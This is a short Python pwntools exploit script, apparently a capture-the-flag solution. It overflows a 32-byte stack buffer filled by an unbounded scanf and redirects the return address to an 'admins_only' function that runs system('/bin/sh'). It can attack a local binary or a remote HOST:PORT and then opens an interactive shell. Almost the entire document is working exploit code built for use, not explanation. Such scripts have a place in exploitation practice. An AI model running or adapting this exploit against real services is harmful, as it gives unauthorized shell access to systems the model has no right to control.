from pwn import *

'''

function : general
    char message[32];
    scanf("%s", message);
    if (strcmp(message, "yes")) == 0 { ... }

function: admins_only
    system("/bin/sh")

payload: $PAYLOAD

'''

'''         [32]         [RBP]     [admins_only address]         '''
PAYLOAD = b"\x90"*32 + b"\x90"*8 + p64(0x401554)

def exploit_l(file: str):
    p = process(file)
    p.recv()
    p.sendline(b"3")
    input()
    p.recv()
    p.sendline(PAYLOAD)
    p.recv()
    p.interactive()

def exploit_r(host_port: list):
    HOST, PORT = host_port[0], host_port[1]
    c = remote(HOST,int(PORT))
    c.recv()
    c.sendline(b"3")
    c.recv()
    c.sendline(PAYLOAD)
    c.interactive()

def main():
    import sys
    try:
        content: str = sys.argv[2]
        if sys.argv[1] == '-l': exploit_l(content)
        if sys.argv[1] == '-r': exploit_r(str(content).split(":"))
    except:
        print("python exploit.py -l file.out        : for locally  exploit")
        print("python exploit.py -r HOST:PORT       : for remotely exploit!")

if __name__ == "__main__":
    main()

